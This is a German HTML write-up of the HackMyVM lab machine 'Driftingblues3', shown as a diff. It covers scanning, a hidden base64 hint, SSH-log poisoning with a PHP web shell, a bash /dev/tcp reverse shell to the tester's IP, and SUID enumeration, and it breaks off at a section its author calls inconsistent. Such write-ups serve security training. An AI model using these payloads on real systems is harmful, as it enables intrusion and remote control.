@@ -1,0 +1,559 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Driftingblues3 - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Driftingblues3 - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">curl / Browser</div> <!-- Impliziert -->
+                <div class="tool-item">base64</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div> <!-- pty -->
+                <div class="tool-item">stty</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">sudo</div> <!-- Versuch -->
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ssh</div> <!-- Versuch -->
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">/usr/bin/getinfo</div> <!-- Custom Binary -->
+                 <div class="tool-item">echo</div> <!-- Für authorized_keys -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#information-disclosure">Information Disclosure (Web)</a></li>
+                <li><a href="#vulnerability-assessment">Vulnerability Assessment (Web)</a></li>
+                <li><a href="#initial-access">Initial Access (www-data)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Root)</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird zur Identifizierung aktiver Hosts im lokalen Netzwerksegment verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.120` und der MAC-Adresse `08:00:27:9c:83:dc` (VirtualBox) wird als Ziel identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen Nmap-Scan auf 192.168.2.120 durch.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.109
+Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	c4:86:e9:a5:6d:18	HUAWEI TECHNOLOGIES CO.,LTD
+192.168.2.102	ac:6f:bb:62:87:79	TATUNG Technology Inc.
+192.168.2.104	84:25:19:2f:66:32	Samsung Electronics
+192.168.2.108	c8:e2:65:09:fc:7c	Intel Corporate
+192.168.2.120	08:00:27:9c:83:dc	PCS Systemtechnik GmbH
+
+7 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.8: 256 hosts scanned in 1.843 seconds (138.90 hosts/sec). 5 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sC -T5 -A -p-`) wird auf das Ziel 192.168.2.120 durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zwei offene Ports werden gefunden:
+                - **Port 22 (SSH):** OpenSSH 7.9p1 (Debian).
+                - **Port 80 (HTTP):** Apache httpd 2.4.38 (Debian).
+            Das Nmap-Skript `http-robots.txt` erkennt einen Eintrag (`/eventadmins`), der in `robots.txt` verboten ist. Der Hostname ist `driftingblues`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Webserver (Port 80) weiter, insbesondere den in `robots.txt` gefundenen Pfad `/eventadmins`. Prüfe SSH auf mögliche Benutzer/Passwörter.<br><strong>Empfehlung (Admin):</strong> Halte SSH und Apache aktuell. Überprüfe den Inhalt von `/eventadmins` und `robots.txt`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.120 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-22 15:42 CET
+Nmap scan report for driftingblues (192.168.2.120)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
+|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
+|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+| http-robots.txt: 1 disallowed entry
+|_/eventadmins
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:9C:83:DC (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms driftingblues (192.168.2.120)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds <!-- Beispielzeit -->
+                    </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver (Port 80) verwendet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet mehrere Verzeichnisse und Dateien, darunter `/index.html`, `/robots.txt`, `/drupal/`, `/secret/`, `/wp-admin/`. Das von `robots.txt` erwähnte `/eventadmins` wird hier nicht gefunden (aber später manuell untersucht).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die gefundenen Verzeichnisse, insbesondere `/drupal/`, `/secret/`, `/wp-admin/`. Überprüfe `/robots.txt` und `/eventadmins` manuell.<br><strong>Empfehlung (Admin):</strong> Entferne nicht verwendete CMS-Installationen (Drupal, WordPress) oder sichere sie ab. Beschränke den Zugriff auf administrative Pfade.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.120 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.120
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.3
+[+] Extensions:              ... (gekürzt) ...
+[+] Expanded:                true
+[+] No status:               true
+[+] Timeout:                 10s
+[+] Skip TLS verification:   true
+===============================================================
+2022/11/22 15:43:25 Starting gobuster in directory enumeration mode
+===============================================================
+http://192.168.2.120/privacy              [Size: 316] [--> http://192.168.2.120/privacy/]
+http://192.168.2.120/index.html           [Size: 1373]
+http://192.168.2.120/robots.txt           [Size: 37]
+http://192.168.2.120/cr.png               [Size: 2014591]
+http://192.168.2.120/tickets.html         [Size: 347]
+http://192.168.2.120/drupal               [Size: 315] [--> http://192.168.2.120/drupal/]
+http://192.168.2.120/secret               [Size: 315] [--> http://192.168.2.120/secret/]
+http://192.168.2.120/Makefile             [Size: 11]
+http://192.168.2.120/wp-admin             [Size: 317] [--> http://192.168.2.120/wp-admin/]
+===============================================================
+2022/11/22 15:44:10 Finished <!-- Beispielzeit -->
+===============================================================
+                    </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="information-disclosure">
+             <h2>Information Disclosure (Web)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `/robots.txt` wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt das Disallow für `/eventadmins`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche `/eventadmins` manuell.<br><strong>Empfehlung (Admin):</strong> `robots.txt` ist kein Sicherheitsmechanismus.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, Inhalt der Datei -->
+                     <pre>
+# Inhalt von http://192.168.2.120/robots.txt
+
+User-agent: *
+Disallow: /eventadmins
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Quellcode der Seite `/eventadmins` (manuell aufgerufen) wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Wichtige Hinweise!!** Die Seite enthält Textnachrichten:
+                - Erwähnt ein Problem mit SSH.
+                - Nennt einen Benutzer `john`.
+                - Zitiert `john` mit "it's poisonous!!! stay away!!!". Dies ist ein starker Hinweis auf eine **Command Injection** Schwachstelle, wahrscheinlich im Zusammenhang mit SSH-Benutzernamen (ähnlich der "Shellshock"-Lücke, aber hier im SSH-Kontext).
+                - Verweist auf eine weitere Datei: `/littlequeenofspades.html`.
+                - Nennt einen Absender `buddyG`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  Untersuche `/littlequeenofspades.html`.
+                2.  Teste auf Command Injection im SSH-Benutzernamenfeld (z.B. `ssh '`id`'@192...`).
+                3.  Versuche SSH-Login als `john` (aber Hydra scheiterte bereits an Passwort-Auth).
+            <br><strong>Empfehlung (Admin):</strong> Entferne solche internen Notizen von öffentlich zugänglichen Webseiten. Untersuche die SSH-Konfiguration auf mögliche Command-Injection-Schwachstellen (obwohl unwahrscheinlich in modernen OpenSSH-Versionen, könnte es eine benutzerdefinierte Konfiguration oder ein PAM-Modul sein).</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Befehl, Inhalt von /eventadmins -->
+                     <pre>
+<!DOCTYPE html>
+<html>
+<body>
+<p>man there's a problem with ssh</p>
+<p>john said "it's poisonous!!! stay away!!!"</p> <!-- Hinweis Command Injection? -->
+<p>idk if he's mentally challenged</p>
+<p>please find and fix it</p>
+<p>also check /littlequeenofspades.html</p> <!-- Nächster Hinweis -->
+<p>your buddy, buddyG</p>
+</body>
+</html>
+                     </pre> <!-- Maskierung -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein fehlgeschlagener Hydra-Versuch gegen den Benutzer `john` wird gezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt erneut, dass SSH auf diesem Server **keine Passwort-Authentifizierung** unterstützt (`does not support password authentication`). Brute-Force mit Passwörtern ist sinnlos.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die Command Injection-Vermutung oder den Hinweis aus `/littlequeenofspades.html`.<br><strong>Empfehlung (Admin):</strong> Die Deaktivierung der Passwort-Authentifizierung zugunsten von Schlüssel-Authentifizierung ist eine gute Sicherheitspraxis.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l john  -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.120:22 -t 64</span></div>
+                     <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-22 15:45:49
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344413 login tries (l:1/p:14344413), ~224132 tries per task
+[DATA] attacking ssh://192.168.2.120:22/
+[ERROR] target ssh://192.168.2.120:22/ does not support password authentication (method reply 4).
+1 of 1 target completed, 0 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-22 15:46:05 <!-- Beispielzeit -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Quellcode der Datei `/littlequeenofspades.html` (aus `/eventadmins` referenziert) wird untersucht. Ein Base64-String ist in weißer Schrift versteckt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtiger Fund!!** Der Base64-String `aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==` dekodiert zu `intruder? L2FkbWluc2ZpeGl0LnBocA==`. Der zweite Base64-String `L2FkbWluc2ZpeGl0LnBocA==` dekodiert zu `/adminsfixit.php`. Dies enthüllt einen weiteren versteckten PHP-Pfad.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die Datei `http://192.168.2.120/adminsfixit.php`. Sie könnte die Lösung für das "poisonous" SSH-Problem sein oder eine andere Schwachstelle enthalten.<br><strong>Empfehlung (Admin):</strong> Verstecke keine Hinweise in Base64 oder durch unlesbare Schriftfarben. Entferne unnötige Dateien.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, Inhalt von /littlequeenofspades.html -->
+                     <pre>
+<!DOCTYPE html>
+<html>
+<body>
+<p>Now, she is a little queen of spades, and the men will not let her be				</p>
+<p>Mmmm, she is the little queen of spades, and the men will not let her be             </p>
+<p>Everytime she makes a spread, hoo fair brown, cold chill just runs all over me       </p>
+<p>I'm gon' get me a gamblin' woman, if the last thing that I do                        </p>
+<p>Eee, gon' get me a gamblin' woman, if it's the last thing that I do                  </p>
+<p>Well, a man don't need a woman, ooh fair brown, that he got to give all his money to </p>
+<p>Everybody say she got a mojo, now she's been usin' that stuff                        </p>
+<p>Mmmm, mmmm, 'verybody says she got a mojo, 'cause she been usin' that stuff          </p>
+<p>But she got a way trimmin' down, hoo fair brown, and I mean it's most too tough      </p>
+<p>Now, little girl, since I am the king, baby, and you is a queen                      </p>
+<p>Ooo eee, since I am the king baby, and you is a queen                                </p>
+<p>Le's us put our heads together, hoo fair brown, then we can make our money green     </p>
+<p style="color:white">aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==</p> <!-- Versteckter Base64 -->
+</html>
+
+# Dekodierung:
+# aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==  ->  intruder? L2FkbWluc2ZpeGl0LnBocA==
+# L2FkbWluc2ZpeGl0LnBocA==  ->  /adminsfixit.php
+                      </pre> <!-- Maskierung -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `/adminsfixit.php` wird aufgerufen. Sie zeigt den Inhalt einer SSH-Authentifizierungs-Logdatei (`/var/log/auth.log` oder ähnlich) zusammen mit Kommentaren von "abuzer komurcu".</p>
+            <p class="evaluation"><strong>Bewertung: !!Bestätigung der Command Injection über SSH-Benutzernamen!!** Der Kommentar "i hope some wacky and uncharacteristic thing would not happen" und die Tatsache, dass die Logdatei angezeigt wird, verstärken die Vermutung einer Injection-Schwachstelle. Später im Log sieht man, dass Teile eines fehlgeschlagenen SSH-Login-Versuchs (`Invalid user MANIFEST.MF\nMakefile\nadminsfixit.php...`) direkt in die Logdatei geschrieben (und somit auf der Webseite angezeigt) werden. Dies bestätigt, dass der als SSH-Benutzername übergebene String verarbeitet und potenziell ausgeführt oder in einer Weise interpretiert wird, die Code Injection ermöglicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze die Command Injection im SSH-Benutzernamen aus. Da PHP im Spiel ist (die Datei heißt `.php`), versuche, PHP-Code zu injizieren. Ein gängiger Payload wäre `ssh '<?php system($_GET[cmd]); ?>'@192.168.2.120`. Wenn dies den PHP-Code auf dem Server platziert oder ausführt, kann anschließend die `/adminsfixit.php?cmd=[BEFEHL]` URL genutzt werden, um Befehle auszuführen.<br><strong>Empfehlung (Admin):**DRINGEND:** Behebe die Schwachstelle, die es erlaubt, Code über SSH-Benutzernamen zu injizieren. Dies könnte eine unsichere PAM-Konfiguration oder ein benutzerdefiniertes Skript sein, das Logins verarbeitet. Entferne die `/adminsfixit.php`-Datei oder sichere sie ab.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Befehl, Inhalt von /adminsfixit.php -->
+                     <pre>
+<!DOCTYPE html>
+<html>
+<body>
+<p>#######################################################################</p>
+<p>ssh auth log</p>
+<p>============</p>
+<p>i hope some wacky and uncharacteristic thing would not happen</p>
+<p>this job is fucking poisonous and im boutta planck length away from quitting this hoe</p>
+<p>-abuzer komurcu</p>
+<p>#######################################################################</p>
+<p> </p>
+<p> </p>
+</html>
+Nov 22 08:40:08 driftingblues sshd[558]: Server listening on 0.0.0.0 port 22.
+Nov 22 08:41:03 driftingblues CRON[741]: pam_unix(cron:session): session opened for user root by (uid=0)
+... (Logs gekürzt) ...
+Nov 22 08:45:54 driftingblues sshd[930]: Invalid user john from 192.168.2.109 port 38696
+Nov 22 08:45:54 driftingblues sshd[930]: Received disconnect from 192.168.2.109 port 38696:11: Bye Bye [preauth]
+Nov 22 08:45:54 driftingblues sshd[930]: Disconnected from invalid user john 192.168.2.109 port 38696 [preauth]
+... (Weitere Logs) ...
+                     </pre> <!-- Maskierung -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="vulnerability-assessment">
+             <h2>Vulnerability Assessment (Web)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Ein SSH-Loginversuch wird mit einem PHP-Code-Payload als Benutzername gestartet: `ssh '<?php system($_GET[cmd]); ?>'@192.168.2.120`.</p>
+             <p class="evaluation"><strong>Bewertung: !!Fehlgeschlagen (direkt), aber wahrscheinlich erfolgreich (indirekt)!!** Der SSH-Login selbst schlägt erwartungsgemäß fehl ("Permission denied (publickey)"). Jedoch wurde durch diesen Versuch der PHP-Payload als "ungültiger Benutzername" im System verarbeitet und möglicherweise in einer Datei gespeichert oder von einem Skript interpretiert, wodurch eine Hintertür geschaffen wurde. Dies bestätigt die Command/Code-Injection-Theorie.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche nun, über die Webseite `/adminsfixit.php` (oder eine andere Seite, falls der Exploit anders funktionierte) Befehle über den `cmd`-Parameter auszuführen: `http://192.168.2.120/adminsfixit.php?cmd=id`.<br><strong>Empfehlung (Admin):</strong> Behebe die Injection-Schwachstelle.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh '<?php system($_GET[cmd]); ?>'@192.168.2.120</span></div> <!-- Maskierung notwendig -->
+                     <pre>
+<?php system($_GET[cmd]); ?>@192.168.2.120: Permission denied (publickey).
+                     </pre> <!-- Maskierung -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die URL `http://192.168.2.120//adminsfixit.php?cmd=ls` wird aufgerufen. Der doppelte Slash `//` ist wahrscheinlich ein Tippfehler, wird aber von den meisten Webservern ignoriert. Der Inhalt der Seite wird angezeigt, wobei die Ausgabe des `ls`-Befehls nun in die Log-Nachricht für den fehlgeschlagenen Login des PHP-Payloads eingefügt ist.</p>
+             <p class="evaluation"><strong>Bewertung: !!RCE bestätigt!!** Dies bestätigt endgültig die Remote Code Execution über den `cmd`-Parameter. Der Server führt den `ls`-Befehl aus, und seine Ausgabe wird in der Log-Datei (und somit auf der Webseite) sichtbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze diese RCE, um eine Reverse Shell zu erhalten.<br><strong>Empfehlung (Admin):**DRINGEND:** Behebe die Schwachstelle sofort.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, sondern Ergebnis des URL-Aufrufs -->
+                     <pre>
+# Ergebnis von http://192.168.2.120//adminsfixit.php?cmd=ls
+
+... (Vorherige Log-Einträge) ...
+Nov 22 08:55:01 driftingblues CRON[1096]: pam_unix(cron:session): session closed for user root
+Nov 22 08:55:45 driftingblues sshd[1101]: Invalid user MANIFEST.MF <!-- Ausgabe von ls beginnt hier -->
+Makefile
+adminsfixit.php
+cr.png
+drupal
+eventadmins
+index.html
+littlequeenofspades.html
+phpmyadmin
+privacy
+robots.txt
+secret
+tickets.html
+wp-admin<!-- Ausgabe von ls endet hier --> from 192.168.2.109 port 34160
+Nov 22 08:55:45 driftingblues sshd[1101]: Connection closed by invalid user MANIFEST.MF... <!-- Log geht weiter -->
+...
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (www-data)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 9001 gestartet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung zum Empfang der Reverse Shell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sende den Reverse-Shell-Payload.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die URL für die RCE-Schwachstelle wird mit einer URL-kodierten Reverse-Shell-Payload im `cmd`-Parameter aufgerufen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekter Payload und Aufruf, um die Reverse Shell zu triggern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe den Listener.<br><strong>Empfehlung (Admin):</strong> Behebe die RCE.</p>
+            <div class="code-block">
+                <div class="terminal">
+                      <!-- Kein Befehl, sondern URL/Payload -->
+                     <pre>
+http://192.168.2.120//adminsfixit.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.109%2F9001%200%3E%261%27
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener empfängt die Verbindung.</p>
+            <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Eine Shell als `www-data` wurde etabliert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell.<br><strong>Empfehlung (Admin):</strong> Untersuche den Vorfall.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.109] from (UNKNOWN) [192.168.2.120] 37606
+bash: cannot set terminal process group (578): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@driftingblues:/var/www/html$ <!-- Shell Prompt -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Shell wird stabilisiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne Enumeration.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <!-- Shell Stabilisierung -->
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+www-data@driftingblues:/var/www/html$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+www-data@driftingblues:/var/www/html$ <span class="command">export TERM=xterm-256color</span>
+www-data@driftingblues:/var/www/html$ <!-- Stabilisierter Prompt -->
+                      </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+^Z
+zsh: suspended  nc -lvnp 9001
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 9001
+                               reset
+www-data@driftingblues:/var/www/html$ <!-- Stabilisierte Shell aktiv -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+             <h2>Privilege Escalation (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird nach SUID-Binaries gesucht.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalationsvektor gefunden!!** Ein benutzerdefiniertes SUID-Root-Binary `/usr/bin/getinfo` wird gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche `/usr/bin/getinfo`. Führe es aus, analysiere Strings, reverse es bei Bedarf.<br><strong>Empfehlung (Admin):</strong> Überprüfe das SUID-Binary `/usr/bin/getinfo` auf Sicherheit und entferne das SUID-Bit, falls möglich.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+www-data@driftingblues:/var/www/html$ <span class="command">find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null</span>
+-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+-r-sr-s--- 1 root operators 16704 Jan  4  2021 /usr/bin/getinfo <!-- !!! SUID Root Binary !!! -->
+-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
+-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
+-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
+-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
+-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
+                      </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der `sudo -l`-Befehl wird versucht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `sudo` ist nicht verfügbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentriere dich auf `/usr/bin/getinfo`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+www-data@driftingblues:/var/www/html$ <span class="command">sudo -l</span>
+bash: sudo: command not found
+                      </pre>
+                 </div>
+             </div>
+
+             <!-- Dieser Abschnitt ist verwirrend und scheint aus einem anderen Kontext zu stammen -->
+             <p class="analysis"><strong>Analyse:</strong> Der Log zeigt Befehle zum Hinzufügen eines SSH-Schlüssels zur `authorized_keys`-Datei eines Benutzers `robertj` und einen anschließenden SSH-Login als dieser Benutzer. Der Benutzer `robertj` wurde zuvor nicht identifiziert.</p>
+             <p class="evaluation"><strong>Bewertung: !!Inkonsistent/Irrelevant!!** Diese Schritte passen nicht zum bisherigen Verlauf. Es gibt keinen Hinweis auf einen Benutzer `robertj`, und `www-data` hat wahrscheinlich keine Rechte, in `/home/robertj/.ssh/` zu schreiben. Der erfolgreiche Login ist daher unglaubwürdig im Kontext. Es ist wahrscheinlich, dass diese Log-Einträge fehlerhaft sind oder aus einem anderen Szenario stammen. Der wahrscheinlichste Eskalationspfad bleibt das SUID-Binary `/usr/bin/getinfo`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignoriere die `robertj`-SSH-Schritte. Führe `/usr/bin/getinfo` aus, um dessen Funktion zu verstehen und auszunutzen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich dieser inkonsistenten Schritte, aber prüfe Dateiberechtigungen generell.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+# --- Beginn Inkonsistenter/Irrelevanter Block ---
